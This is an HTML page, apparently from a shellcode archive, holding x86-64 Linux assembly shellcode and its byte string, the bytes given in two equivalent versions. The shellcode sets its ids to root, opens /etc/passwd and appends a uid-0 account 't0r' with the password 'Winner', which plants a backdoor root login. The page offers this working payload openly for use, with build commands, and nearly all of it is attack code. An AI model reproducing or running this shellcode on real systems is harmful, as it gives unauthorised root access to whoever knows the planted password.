<html><head><title>Linux/x86-64 - add user with passwd - 189 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
;sc_adduser01.S
;Arch:          x86_64, Linux
;
;Author:        0_o -- null_null
;           nu11.nu11 [at] yahoo.com
;Date:          2012-03-05
;
;compile an executable: nasm -f elf64 sc_adduser.S
;           ld -o sc_adduser sc_adduser.o
;compile an object: nasm -o sc_adduser_obj sc_adduser.S
;
;Purpose:       adds user &quot;t0r&quot; with password &quot;Winner&quot; to /etc/passwd
;executed syscalls:     setreuid, setregid, open, write, close, exit
;Result:        t0r:3UgT5tXKUkUFg:0:0::/root:/bin/bash
;syscall op codes:  /usr/include/x86_64-linux-gnu/asm/unistd_64.h
BITS 64
[SECTION .text]
global _start
_start:
    ;sys_setreuid(uint ruid, uint euid)
        xor     rax,    rax
        mov     al,     113                     ;syscall sys_setreuid
        xor     rbx,    rbx                     ;arg 1 -- set real uid to root
        mov     rcx,    rbx                     ;arg 2 -- set effective uid to root
        syscall
        ;sys_setregid(uint rgid, uint egid)
        xor     rax,    rax
        mov     al,     114                     ;syscall sys_setregid
    xor     rbx,    rbx                     ;arg 1 -- set real uid to root
        mov     rcx,    rbx                     ;arg 2 -- set effective uid to root
        syscall
    ;push all strings on the stack prior to file operations.
    xor rbx,    rbx
    mov     ebx,    0x647773FF
        shr     rbx,    8
        push    rbx                             ;string \00dws
        mov     rbx,    0x7361702f6374652f
        push    rbx                             ;string sap/cte/
    mov     rbx,    0x0A687361622F6EFF
        shr     rbx,    8
        push    rbx                             ;string \00\nhsab/n
        mov     rbx,    0x69622F3A746F6F72
        push    rbx                             ;string ib/:toor
        mov     rbx,    0x2F3A3A303A303A67
        push    rbx                             ;string /::0:0:g
    mov rbx,    0x46556B554B587435
    push    rbx             ;string FUkUKXt5
    mov rbx,    0x546755333A723074
    push    rbx             ;string TgU3:r0t
    ;prelude to doing anything useful...
    mov rbx,    rsp         ;save stack pointer for later use
    push    rbp             ;store base pointer to stack so it can be restored later
    mov rbp,    rsp         ;set base pointer to current stack pointer
    ;sys_open(char* fname, int flags, int mode)
    sub rsp,        16
    mov [rbp - 16], rbx     ;store pointer to &quot;t0r..../bash&quot;
    mov si,     0x0401      ;arg 2 -- flags
    mov rdi,        rbx
    add rdi,        40      ;arg 1 -- pointer to &quot;/etc/passwd&quot;
    xor rax,        rax
    mov al,     2       ;syscall sys_open
    syscall
    ;sys_write(uint fd, char* buf, uint size)
    mov [rbp - 4],  eax     ;arg 1 -- fd is retval of sys_open. save fd to stack for later use.
    mov rcx,        rbx     ;arg 2 -- load rcx with pointer to string &quot;t0r.../bash&quot;
    xor rdx,        rdx
    mov dl,     39      ;arg 3 -- load rdx with size of string &quot;t0r.../bash\00&quot;
    mov rsi,        rcx     ;arg 2 -- move to source index register
    mov rdi,        rax     ;arg 1 -- move to destination index register
    xor     rax,            rax
        mov     al,             1               ;syscall sys_write
        syscall
    ;sys_close(uint fd)
    xor rdi,        rdi
    mov edi,        [rbp - 4]   ;arg 1 -- load stored file descriptor to destination index register
    xor rax,        rax
    mov al,     3       ;syscall sys_close
    syscall
    ;sys_exit(int err_code)
    xor rax,    rax
    mov al, 60          ;syscall sys_exit
    xor rbx,    rbx         ;arg 1 -- error code
    syscall
;char shellcode[] =
;   &quot;\x48\x31\xc0\xb0\x71\x48\x31\xdb\x48\x31\xc9\x0f\x05\x48\x31&quot;
;   &quot;\xc0\xb0\x72\x48\x31\xdb\x48\x31\xc9\x0f\x05\x48\x31\xdb\xbb&quot;
;   &quot;\xff\x73\x77\x64\x48\xc1\xeb\x08\x53\x48\xbb\x2f\x65\x74\x63&quot;
;   &quot;\x2f\x70\x61\x73\x53\x48\xbb\xff\x6e\x2f\x62\x61\x73\x68\x0a&quot;
;   &quot;\x48\xc1\xeb\x08\x53\x48\xbb\x72\x6f\x6f\x74\x3a\x2f\x62\x69&quot;
;   &quot;\x53\x48\xbb\x67\x3a\x30\x3a\x30\x3a\x3a\x2f\x53\x48\xbb\x35&quot;
;   &quot;\x74\x58\x4b\x55\x6b\x55\x46\x53\x48\xbb\x74\x30\x72\x3a\x33&quot;
;   &quot;\x55\x67\x54\x53\x48\x89\xe3\x55\x48\x89\xe5\x48\x83\xec\x10&quot;
;   &quot;\x48\x89\x5d\xf0\x66\xbe\x01\x04\x48\x89\xdf\x48\x83\xc7\x28&quot;
;   &quot;\x48\x31\xc0\xb0\x02\x0f\x05\x89\x45\xfc\x48\x89\xd9\x48\x31&quot;
;   &quot;\xd2\xb2\x27\x48\x89\xce\x48\x89\xc7\x48\x31\xc0\xb0\x01\x0f&quot;
;   &quot;\x05\x48\x31\xff\x8b\x7d\xfc\x48\x31\xc0\xb0\x03\x0f\x05\x48&quot;
;   &quot;\x31\xc0\xb0\x3c\x48\x31\xdb\x0f\x05&quot;;
;
;equivalent code:
;
;char shellcode[] =
;   &quot;\x48\x31\xc0\xb0\x71\x48\x31\xdb\x48\x89\xd9\x0f\x05\x48\x31&quot;
;   &quot;\xc0\xb0\x72\x48\x31\xdb\x48\x89\xd9\x0f\x05\x48\x31\xdb\xbb&quot;
;   &quot;\xff\x73\x77\x64\x48\xc1\xeb\x08\x53\x48\xbb\x2f\x65\x74\x63&quot;
;   &quot;\x2f\x70\x61\x73\x53\x48\xbb\xff\x6e\x2f\x62\x61\x73\x68\x0a&quot;
;   &quot;\x48\xc1\xeb\x08\x53\x48\xbb\x72\x6f\x6f\x74\x3a\x2f\x62\x69&quot;
;   &quot;\x53\x48\xbb\x67\x3a\x30\x3a\x30\x3a\x3a\x2f\x53\x48\xbb\x35&quot;
;   &quot;\x74\x58\x4b\x55\x6b\x55\x46\x53\x48\xbb\x74\x30\x72\x3a\x33&quot;
;   &quot;\x55\x67\x54\x53\x48\x89\xe3\x55\x48\x89\xe5\x48\x83\xec\x10&quot;
;   &quot;\x48\x89\x5d\xf0\x66\xbe\x01\x04\x48\x89\xdf\x48\x83\xc7\x28&quot;
;   &quot;\x48\x31\xc0\xb0\x02\x0f\x05\x89\x45\xfc\x48\x89\xd9\x48\x31&quot;
;   &quot;\xd2\xb2\x27\x48\x89\xce\x48\x89\xc7\x48\x31\xc0\xb0\x01\x0f&quot;
;   &quot;\x05\x48\x31\xff\x8b\x7d\xfc\x48\x31\xc0\xb0\x03\x0f\x05\x48&quot;
;   &quot;\x31\xc0\xb0\x3c\x48\x31\xdb\x0f\x05&quot;;

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
